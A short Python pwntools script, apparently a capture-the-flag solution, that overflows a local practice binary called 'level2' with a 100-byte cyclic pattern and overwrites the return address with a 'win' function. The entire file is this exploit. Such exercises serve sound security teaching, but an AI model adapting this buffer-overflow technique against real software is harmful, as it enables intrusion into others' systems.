from pwn import *
context.update(arch='i386', os='linux')

DEBUG = False

if DEBUG:
  r = gdb.debug("./level2")
else:
  r = process("./level2")

offset = 100
elf = ELF("./level2")
payload = cyclic(offset) + p32(elf.sym.win)


print(r.recvuntil("me!\n").decode())
r.sendline(payload)
r.interactive()
